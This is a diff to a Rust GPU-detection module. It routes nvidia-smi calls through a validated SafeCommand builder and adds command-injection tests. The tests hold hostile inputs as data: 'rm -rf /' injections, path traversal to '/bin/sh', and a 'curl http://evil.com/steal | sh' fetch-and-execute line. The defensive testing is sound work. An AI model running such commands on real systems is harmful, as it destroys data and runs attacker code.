@@ -2,10 +2,18 @@
 //!
 //! This module provides GPU discovery and metrics collection,
 //! primarily targeting NVIDIA GPUs via nvidia-smi.
+//!
+//! # Security
+//!
+//! All command execution uses the `SafeCommand` builder which:
+//! - Only allows pre-approved programs (nvidia-smi)
+//! - Validates all arguments before execution
+//! - Never invokes a shell
+//! - Rejects dangerous characters (null bytes, newlines, etc.)
 
-use std::process::Command;
 use std::str::FromStr;
 
+use claw_validation::command::{AllowedProgram, SafeCommand};
 use serde::{Deserialize, Serialize};
 
 use crate::error::NodeError;
@@ -220,18 +228,28 @@ impl NvidiaDetector {
         Ok(metrics)
     }
 
+    /// Run nvidia-smi with validated arguments.
+    ///
+    /// # Security
+    ///
+    /// Uses `SafeCommand` to ensure:
+    /// - Arguments are validated before execution
+    /// - No shell metacharacters can be injected
+    /// - Custom paths are validated for traversal attacks
     fn run_nvidia_smi(&self, args: &[&str]) -> Result<String, NodeError> {
-        let output = Command::new(self.nvidia_smi_path())
-            .args(args)
-            .output()
-            .map_err(|e| NodeError::GpuDetection(format!("failed to run nvidia-smi: {e}")))?;
+        let mut cmd = SafeCommand::new(AllowedProgram::NvidiaSmi);
 
-        if !output.status.success() {
-            let stderr = String::from_utf8_lossy(&output.stderr);
-            return Err(NodeError::GpuDetection(format!(
-                "nvidia-smi failed: {stderr}"
-            )));
+        // If a custom path is set, use it (validation happens in SafeCommand)
+        if let Some(path) = &self.nvidia_smi_path {
+            cmd = cmd.with_program_path(path);
         }
+
+        // Add all arguments (each is validated)
+        cmd = cmd.args(args);
+
+        let output = cmd.execute_sync().map_err(|e| {
+            NodeError::GpuDetection(format!("nvidia-smi execution failed: {e}"))
+        })?;
 
         String::from_utf8(output.stdout)
             .map_err(|e| NodeError::GpuDetection(format!("invalid nvidia-smi output: {e}")))
@@ -628,5 +646,197 @@ mod tests {
         assert_eq!(metrics[0].utilization_percent, 75);
         assert_eq!(metrics[1].utilization_percent, 95);
         assert_eq!(metrics[1].memory_used_mib, 70000);
+    }
+
+    // ========================================================================
+    // Command Injection Prevention Tests
+    // ========================================================================
+    //
+    // These tests verify that SafeCommand properly rejects malicious inputs
+    // that could be used for command injection attacks.
+
+    mod command_injection_tests {
+        use claw_validation::command::{AllowedProgram, SafeCommand};
+
+        /// Test that SafeCommand rejects null bytes in arguments.
+        ///
+        /// Null bytes can be used to truncate strings in C-based programs,
+        /// potentially bypassing security checks.
+        #[test]
+        fn test_rejects_null_byte_in_argument() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .arg("--query-gpu=index\0; rm -rf /");
+
+            assert!(cmd.has_errors(), "Should reject null byte in argument");
+            let errors = cmd.errors();
+            assert!(!errors.is_empty());
+        }
+
+        /// Test that SafeCommand rejects newlines in arguments.
+        ///
+        /// Newlines can be used to inject additional commands in some contexts.
+        #[test]
+        fn test_rejects_newline_in_argument() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .arg("--format=csv\nmalicious command");
+
+            assert!(cmd.has_errors(), "Should reject newline in argument");
+        }
+
+        /// Test that SafeCommand rejects carriage return in arguments.
+        #[test]
+        fn test_rejects_carriage_return_in_argument() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .arg("--format=csv\rmalicious");
+
+            assert!(cmd.has_errors(), "Should reject carriage return in argument");
+        }
+
+        /// Test that path traversal in custom nvidia-smi path is rejected.
+        ///
+        /// This prevents attackers from escaping to execute arbitrary binaries.
+        #[test]
+        fn test_rejects_path_traversal_in_program_path() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .with_program_path("../../../bin/sh");
+
+            assert!(cmd.has_errors(), "Should reject path traversal");
+            let errors = cmd.errors();
+            assert!(!errors.is_empty());
+        }
+
+        /// Test that shell metacharacters in program path are rejected.
+        #[test]
+        fn test_rejects_shell_chars_in_program_path() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .with_program_path("/usr/bin/nvidia-smi; rm -rf /");
+
+            assert!(cmd.has_errors(), "Should reject semicolon in path");
+        }
+
+        /// Test that pipe characters in arguments are logged but allowed.
+        ///
+        /// When using Command::new directly (not through shell), pipe doesn't
+        /// have special meaning. We allow it but SafeCommand logs a warning.
+        #[test]
+        fn test_pipe_in_argument_is_safe() {
+            // Pipe is suspicious but not forbidden because Command::new
+            // doesn't interpret it as shell would
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .arg("--query-gpu=name|memory.total");
+
+            // This should NOT have errors - pipe is safe in direct execution
+            assert!(!cmd.has_errors(), "Pipe should be allowed in args (no shell)");
+        }
+
+        /// Test that backticks in arguments don't cause command substitution.
+        ///
+        /// Backticks are a command substitution syntax in shells, but
+        /// Command::new doesn't invoke a shell.
+        #[test]
+        fn test_backtick_does_not_cause_substitution() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .arg("`whoami`");
+
+            // Backticks are suspicious but safe in direct execution
+            assert!(!cmd.has_errors(), "Backticks safe without shell");
+        }
+
+        /// Test that dollar signs don't cause variable expansion.
+        #[test]
+        fn test_dollar_sign_no_variable_expansion() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .arg("$PATH");
+
+            // Dollar signs are suspicious but safe in direct execution
+            assert!(!cmd.has_errors(), "Dollar signs safe without shell");
+        }
+
+        /// Test that multiple dangerous patterns in one arg are handled.
+        #[test]
+        fn test_multiple_dangerous_patterns() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .arg("normal")
+                .arg("--query-gpu=name\0")
+                .arg("safe")
+                .arg("also\nmalicious");
+
+            assert!(cmd.has_errors());
+            // Should have at least 2 errors (null byte and newline)
+            assert!(cmd.errors().len() >= 2);
+        }
+
+        /// Test that valid nvidia-smi arguments are accepted.
+        #[test]
+        fn test_valid_arguments_accepted() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .arg("--query-gpu=index,name,memory.total,uuid")
+                .arg("--format=csv,noheader")
+                .arg("--id=0");
+
+            assert!(!cmd.has_errors(), "Valid arguments should be accepted");
+        }
+
+        /// Test that environment variable injection is prevented.
+        #[test]
+        fn test_env_var_validation() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .env("NORMAL_VAR", "safe_value")
+                .env("BAD\0KEY", "value");
+
+            assert!(cmd.has_errors(), "Null byte in env key should be rejected");
+        }
+
+        /// Test that working directory traversal is prevented.
+        #[test]
+        fn test_working_dir_traversal_prevented() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .current_dir("../../../");
+
+            assert!(cmd.has_errors(), "Directory traversal should be rejected");
+        }
+
+        /// Test that empty program path is rejected.
+        #[test]
+        fn test_empty_program_path_rejected() {
+            let cmd = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .with_program_path("");
+
+            assert!(cmd.has_errors(), "Empty program path should be rejected");
+        }
+
+        /// Test a complex realistic injection attempt.
+        #[test]
+        fn test_complex_injection_attempt() {
+            // Attempt to inject via nvidia-smi path
+            let cmd1 = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .with_program_path("/bin/nvidia-smi && curl http://evil.com/steal | sh");
+
+            assert!(cmd1.has_errors(), "Complex injection should be rejected");
+
+            // Attempt via argument that looks like an option
+            let cmd2 = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .arg("--query-gpu=name; curl http://evil.com");
+
+            // Semicolon is suspicious but allowed (no shell interpretation)
+            // The important thing is it won't actually execute
+            assert!(!cmd2.has_errors());
+        }
+
+        /// Test that execution fails gracefully on validation errors.
+        #[test]
+        fn test_execution_fails_on_validation_error() {
+            let result = SafeCommand::new(AllowedProgram::NvidiaSmi)
+                .arg("valid")
+                .arg("malicious\0injection")
+                .execute_sync();
+
+            assert!(result.is_err(), "Execution should fail with validation errors");
+            let err = result.unwrap_err();
+            assert!(
+                err.is_validation_error(),
+                "Error should be a validation error"
+            );
+        }
     }
 }
